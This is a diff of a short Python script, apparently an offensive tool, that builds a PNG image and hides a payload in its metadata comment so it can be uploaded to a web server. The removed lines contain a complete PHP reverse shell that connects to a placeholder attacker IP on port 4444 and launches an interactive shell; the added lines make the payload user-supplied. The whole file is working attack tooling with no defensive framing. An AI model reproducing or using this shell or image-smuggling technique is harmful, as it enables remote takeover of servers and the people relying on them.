@@ -8,22 +8,14 @@ import io
 img = Image.new('RGB', (1920, 1080), color='black')
 
 # PHP reverse shell payload
-php_payload = '''<?php
-// PHP Reverse Shell - embedded in PNG metadata
-// Connect back to attacker machine
+payload=input("Enter Payload Here: ")
 
-$ip = 'ATTACKER_IP';  // Replace with your IP
-$port = 4444;         // Replace with your port
-
-$sock = fsockopen($ip, $port) or die("Could not connect");
-exec("/bin/sh -i <&3 >&3 2>&3");
-?>'''
 
 # Embed PHP code in PNG text chunks (metadata comments)
 img.save(
-    '/home/surzal/git/payloads/reverse_shell.png',
+    '/home/surzal/Desktop/reverse_shell.png',
     'PNG',
-    comment=php_payload
+    comment=payload
 )
 
 print("Created reverse_shell.png (1920x1080) with embedded PHP payload.")
